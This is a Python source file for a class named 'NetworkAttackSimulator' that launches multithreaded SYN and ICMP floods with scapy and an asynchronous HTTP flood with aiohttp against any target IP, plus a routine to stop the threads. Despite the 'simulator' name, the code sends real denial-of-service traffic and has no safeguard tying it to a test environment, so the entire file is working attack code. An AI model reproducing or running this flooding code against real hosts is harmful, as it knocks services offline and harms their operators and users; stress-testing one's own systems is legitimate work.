import threading
import requests
import time
import asyncio
import aiohttp
from scapy.all import send, IP, ICMP, TCP
from logger import setup_logger

class NetworkAttackSimulator:
    def __init__(self, target_ip, logger):
        self.target_ip = target_ip
        self.logger = logger
        self.attacking = False
        self.intensity = 0
        self.attack_threads = []
        self.stop_event = threading.Event()
        self.packet_count = 0

    def validate_ip(self):
        try:
            parts = self.target_ip.split('.')
            if len(parts) != 4:
                return False
            for part in parts:
                if not 0 <= int(part) <= 255:
                    return False
            return True
        except ValueError:
            return False

    def perform_syn_flood(self, intensity):
        if not self.validate_ip():
            self.logger.error(f"Invalid IP address: {self.target_ip}")
            return

        self.stop_attack()

        self.logger.info(f"Starting SYN Flood attack on {self.target_ip}")
        self.intensity = intensity
        self.attacking = True
        self.stop_event.clear()
        self.packet_count = 0  # Reset packet count
        for _ in range(20):
            attack_thread = threading.Thread(target=self.send_syn_packets)
            self.attack_threads.append(attack_thread)
            attack_thread.start()
        return self.attack_threads

    def perform_icmp_flood(self, intensity):
        if not self.validate_ip():
            self.logger.error(f"Invalid IP address: {self.target_ip}")
            return

        self.stop_attack()

        self.logger.info(f"Starting ICMP Flood attack on {self.target_ip}")
        self.intensity = intensity
        self.attacking = True
        self.stop_event.clear()
        self.packet_count = 0  # Reset packet count
        for _ in range(20):
            attack_thread = threading.Thread(target=self.send_icmp_packets)
            self.attack_threads.append(attack_thread)
            attack_thread.start()
        return self.attack_threads

    def perform_http_flood_async(self, intensity):
        self.stop_attack()
        url = f"http://{self.target_ip}:8080"
        self.logger.info(f"Starting HTTP Flood attack on {url}")
        self.intensity = intensity
        self.attacking = True
        self.stop_event.clear()
        self.packet_count = 0  # Reset packet count

        attack_thread = threading.Thread(target=self.run_async_http_flood, args=(url,))
        self.attack_threads.append(attack_thread)
        attack_thread.start()

    def run_async_http_flood(self, url):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        tasks = [self.send_http_requests_async(url) for _ in range(50)]
        loop.run_until_complete(asyncio.gather(*tasks))
        loop.close()

    async def send_http_requests_async(self, url):
        async with aiohttp.ClientSession() as session:
            while self.attacking and not self.stop_event.is_set():
                try:
                    async with session.get(url) as response:
                        self.packet_count += 1
                except aiohttp.ClientError as e:
                    self.logger.error(f"HTTP request error: {e}")
                await asyncio.sleep(0.001)  # Минимальная задержка между запросами

    def send_syn_packets(self):
        while self.attacking and not self.stop_event.is_set():
            send(IP(dst=self.target_ip) / TCP(dport=8080, flags="S"), verbose=False)
            self.packet_count += 1
            time.sleep(0.005)

    def send_icmp_packets(self):
        while self.attacking and not self.stop_event.is_set():
            send(IP(dst=self.target_ip) / ICMP(), verbose=False)
            self.packet_count += 1
            time.sleep(0.005)

    def stop_attack(self):
        self.attacking = False
        self.stop_event.set()
        for thread in self.attack_threads:
            if thread.is_alive():
                thread.join(timeout=1)
                if thread.is_alive():
                    self.logger.warning("Forcefully terminating attack thread")
                    thread._stop()
        self.attack_threads = []
        self.logger.info("Attack stopped")
